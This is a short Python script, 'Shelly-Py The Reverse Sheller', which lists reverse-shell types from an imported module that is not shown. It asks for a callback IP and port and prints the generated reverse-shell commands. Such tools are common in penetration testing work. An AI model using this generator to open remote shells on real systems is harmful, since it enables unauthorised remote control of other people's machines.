#!/usr/bin/env -S python3 -B

import shell_codes
from shell_codes import *

print("\n--= Shelly-Py The Reverse Sheller =--")
print("\nPlease choose your shell type\n")

def func_list(MODULE):
	return [x for x in dir(MODULE) if not x.startswith('__')]

for i in func_list(shell_codes):
	print(i)
print()

TYPE = str(input("Select Type: ").lower())
CALLBACK = str(input("Callback IP: "))
PORT = str(input("Callback PORT: "))

print()

x = globals()[TYPE](CALLBACK, PORT)
for i in x:
	print(i+"\n")
